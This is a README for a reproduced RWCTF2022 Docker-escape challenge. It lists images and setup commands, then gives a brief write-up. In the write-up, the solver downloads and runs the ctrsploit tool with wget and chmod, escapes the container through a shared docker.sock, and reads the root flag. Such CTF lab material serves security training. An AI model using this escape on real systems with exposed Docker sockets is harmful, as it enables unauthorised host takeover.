# RWCTF2022: Be-a-Docker-Escaper

Unofficial Copies from https://github.com/WinMin/Be-a-Docker-Escaper/tree/main/Be-a-Docker-Escaper

| Type | Image | Notes |
| ---- | ----- | ----- |
| dqd | ghcr.io/ctrsploit/be-a-docker-escaper:latest | points to `v0.1.0` |
| dqd | ghcr.io/ctrsploit/be-a-docker-escaper:v0.1.0 | migrate from docker_archive |
| dqd | ssst0n3/docker_archive:be-a-docker-escaper_v0.1.0 | - |
| ctr | ghcr.io/ctrsploit/be-a-docker-escaper:ctr_v0.1.0 | - |
| ctr | ssst0n3/docker_archive:ctr_be-a-docker-escaper_v0.1.0 | - |

## usage

### Start and connect

Recommended:

```shell
$ dqd up ctf/Be-a-Docker-Escaper
$ ssh dqd-be-a-docker-escaper
```

Fallback without dqd CLI or SSH config:

```shell
$ cd ctf/Be-a-Docker-Escaper
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
$ ./ssh
```

### Without kvm

KVM can speed up the environment, but it can also be started without KVM.

```shell
$ cd ctf/Be-a-Docker-Escaper
$ docker compose -f docker-compose.yml up -d
```

## writeup

```shell
$ sshpass -p ctf ssh -o StrictHostKeyChecking=no -p 25115 ctf@127.0.0.1
/ # wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul shared-socket docker.sock c
[Y]  docker.sock	# escape by shared docker socket

/ # ctrsploit vul shared-socket docker.sock x
# cat /root/flag
cat /root/flag
rwctf{THIS_IS_A_TEST_FLAG}
```

## build

```shell
make all ENV=ctf/Be-a-Docker-Escaper
```

for developers:

```dockerfile
FROM ghcr.io/ctrsploit/be-a-docker-escaper:ctr_v0.1.0
```
